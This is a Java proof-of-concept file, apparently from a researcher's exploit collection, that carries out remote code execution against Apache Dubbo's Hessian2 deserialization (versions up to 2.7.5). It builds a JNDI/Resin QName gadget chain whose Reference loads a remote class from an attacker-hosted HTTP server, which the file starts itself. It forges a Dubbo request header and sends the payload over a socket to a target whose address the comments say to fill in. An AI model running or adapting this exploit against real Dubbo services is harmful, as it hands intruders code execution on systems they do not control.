package com.threedr3am.bug.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.naming.QName;
import com.threedr3am.bug.server.HTTPServer;
import com.threedr3am.bug.support.NoWriteReplaceSerializerFactory;
import com.threedr3am.bug.utils.Reflections;
import com.threedr3am.bug.utils.ToStringUtil;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Random;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
 *
 * Spring和Spring boot环境下都能打
 *
 * <dependency>
 *    <groupId>com.caucho</groupId>
 *    <artifactId>quercus</artifactId>
 *    <version>4.0.45</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class ResinPoc {

  static {
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws InterruptedException {
    try {
      Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
      Constructor<?> ccCons = ccCl
          .getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
      ccCons.setAccessible(true);
      CannotProceedException cpe = new CannotProceedException();
      Reflections.setFieldValue(cpe, "cause", null);
      Reflections.setFieldValue(cpe, "stackTrace", null);

      cpe.setResolvedObj(new Reference("Foo", "Calc", "http://127.0.0.1:8080/"));

      Reflections.setFieldValue(cpe, "suppressedExceptions", null);
      DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
      QName qName = new QName(ctx, "foo", "bar");

      Object o = ToStringUtil.makeToStringTrigger(qName);

      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

      // header.
      byte[] header = new byte[16];
      // set magic number.
      Bytes.short2bytes((short) 0xdabb, header);
      // set request and serialization flag.
      header[2] = (byte) ((byte) 0x80 | 2);

      // set request id.
      Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

      ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
      ByteArrayOutputStream hessian2ByteArrayOutputStream2 = new ByteArrayOutputStream();
      ByteArrayOutputStream hessian2ByteArrayOutputStream3 = new ByteArrayOutputStream();
      Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
      Hessian2Output out2 = new Hessian2Output(hessian2ByteArrayOutputStream2);
      Hessian2Output out3 = new Hessian2Output(hessian2ByteArrayOutputStream3);
      NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
      sf.setAllowNonSerializable(true);
      out2.setSerializerFactory(sf);

      //todo 经测试，以下4个随意填
      //注册中心获取到的service全限定名、版本号、方法名
      out.writeString("2.0.2");
      out.writeString("com.threedr3am.learn.server.boot.DemoService");
      out.writeString("1.0");
      out.writeString("hello");
      //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
      out.writeString("Ljava/util/Map;");
      out.flushBuffer();
      if (out instanceof Cleanable) {
        ((Cleanable) out).cleanup();
      }

      out2.writeObject(o);
      out2.flushBuffer();
      if (out2 instanceof Cleanable) {
        ((Cleanable) out2).cleanup();
      }

      out3.writeObject(new HashMap());
      out3.flushBuffer();
      if (out3 instanceof Cleanable) {
        ((Cleanable) out3).cleanup();
      }

      Bytes.int2bytes(hessian2ByteArrayOutputStream.size() + hessian2ByteArrayOutputStream2.size()
          + hessian2ByteArrayOutputStream3.size(), header, 12);
      byteArrayOutputStream.write(header);
      byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
      byteArrayOutputStream.write(hessian2ByteArrayOutputStream2.toByteArray());
      byteArrayOutputStream.write(hessian2ByteArrayOutputStream3.toByteArray());

      byte[] bytes = byteArrayOutputStream.toByteArray();

      //todo 此处填写被攻击的dubbo服务提供者地址和端口
      Socket socket = new Socket("127.0.0.1", 20880);
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(bytes);
      outputStream.flush();
      outputStream.close();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
